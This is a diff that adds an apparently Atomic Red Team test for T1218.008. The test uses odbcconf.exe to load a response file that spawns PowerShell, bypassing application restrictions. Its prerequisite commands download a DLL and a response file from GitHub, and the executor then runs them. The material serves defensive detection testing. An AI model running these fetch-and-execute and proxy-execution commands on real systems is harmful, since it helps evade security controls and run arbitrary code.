@@ -25,3 +25,33 @@ atomic_tests:
     command: |
       odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
     name: command_prompt
+- name: Odbcconf.exe - Load Response File
+  auto_generated_guid: 331ce274-f9c9-440b-9f8c-a1006e1fce0b
+  description: |
+    Execute arbitrary response file that will spawn PowerShell.exe.
+    Source files: https://github.com/woanware/application-restriction-bypasses
+  supported_platforms:
+  - windows
+  input_arguments:
+    rsp_file_name:
+      description: Response file name to load
+      type: String
+      default: T1218.008.rsp
+    rsp_file_path:
+      description: Response file path
+      type: String
+      default: PathToAtomicsFolder\T1218.008\bin\
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})
+    prereq_command: |
+      if (Test-Path #{rsp_file_path}#{rsp_file_name}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp" -OutFile "#{rsp_file_path}#{rsp_file_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll" -OutFile "#{rsp_file_path}\o.dll"
+  executor:
+    command: |
+      cd #{rsp_file_path}
+      odbcconf.exe -f #{rsp_file_name}
+    name: command_prompt
